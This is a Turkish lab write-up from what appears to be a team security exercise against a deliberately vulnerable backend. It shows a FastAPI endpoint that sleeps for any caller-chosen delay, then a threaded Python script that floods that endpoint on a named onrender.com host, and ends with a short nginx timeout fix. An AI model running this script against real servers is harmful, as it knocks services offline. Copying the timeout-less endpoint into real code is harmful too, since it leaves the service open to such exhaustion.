# 🐢 Slowloris - Yavaş Ölüm | FEYZA'NIN SALDIRISI

**Senaryo ID:** `feyza-ddos-net`  
**Sorumlu:** Feyza  
**Kategori:** DoS  
**Zayıflık:** No Request Timeout (Zaman Aşımı Yok)  
**Şiddet:** 🔴 YÜKSEK

---

## 🎯 HEDEF: Sunucuyu Yavaşlatarak Öldür!

Binlerce bağlantı aç ama hiçbirini kapatma. Sunucunun tüm kaynaklarını tüket!

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 393

```python
# ❌ TIMEOUT YOK!
@router.get("/slow-endpoint")
def slow_response(delay: int):
    # İstediğin kadar bekletebilirsin!
    time.sleep(delay)
    return {"status": "finally_done"}
```

---

## ⚔️ SALDIRI: Bağlantı Havuzunu Tüket

### Kod: `slowloris_attack.py`

```python
import requests
import threading

BACKEND = "https://evcs-backend-samet.onrender.com"
MAX_THREADS = 100

def attack():
    try:
        # 10 dakika beklet!
        requests.get(f"{BACKEND}/vulnerable/slow-endpoint?delay=600", timeout=10)
    except:
        pass

print("🐢 SLOWLORIS BAŞLIYOR...")

for i in range(MAX_THREADS):
    t = threading.Thread(target=attack)
    t.start()
    if i % 10 == 0:
        print(f"👻 {i} bağlantı esir alındı...")

print("\n✅ Sunucu kaynakları tükeniyor...")
```

---

## 🛡️ SAVUNMA

**Nginx/Apache Timeout:**
`client_body_timeout 5s;`
`client_header_timeout 5s;`

---

**Hazırlayan:** Feyza  
**Durum:** ✅ SERVER IS SLEEPING...
